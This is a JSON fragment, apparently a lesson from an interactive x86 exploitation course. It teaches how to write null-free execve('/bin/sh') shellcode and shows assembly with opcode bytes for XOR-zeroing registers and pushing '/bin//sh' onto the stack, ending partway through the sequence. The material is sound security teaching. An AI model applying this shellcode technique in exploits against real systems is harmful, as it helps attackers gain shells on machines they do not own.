 "title": "113: Shellcode Crafting",
 "desc": "Goal: Write working shellcode that calls execve(\"/bin/sh\", NULL, NULL). Constraints: no null bytes (they terminate strcpy), max 64 bytes. You'll learn how to set up syscall arguments, avoid bad characters, and use tricks like XOR-zeroing registers instead of mov reg, 0.",
 "mode": "step",
 "arch": "x86",
 "source": [
  "// Target: execve(\"/bin/sh\", NULL, NULL)",
  "// Syscall: eax=0x0b, ebx=addr(\"/bin/sh\")",
  "//          ecx=0, edx=0, then int 0x80",
  "",
  "// BAD: contains null bytes!",
  "// mov eax, 0x0b    → B8 0B 00 00 00",
  "// mov ecx, 0       → B9 00 00 00 00",
  "",
  "// GOOD: null-free!",
  "// xor eax, eax     → 31 C0",
  "// mov al, 0x0b     → B0 0B",
  "// xor ecx, ecx     → 31 C9",
  "",
  "// Push \"/bin/sh\" without nulls:",
  "// xor eax, eax",
  "// push eax          → null terminator",
  "// push 0x68732f2f   → \"//sh\"",
  "// push 0x6e69622f   → \"/bin\"",
  "// mov ebx, esp      → ebx = &\"/bin//sh\""
 ],
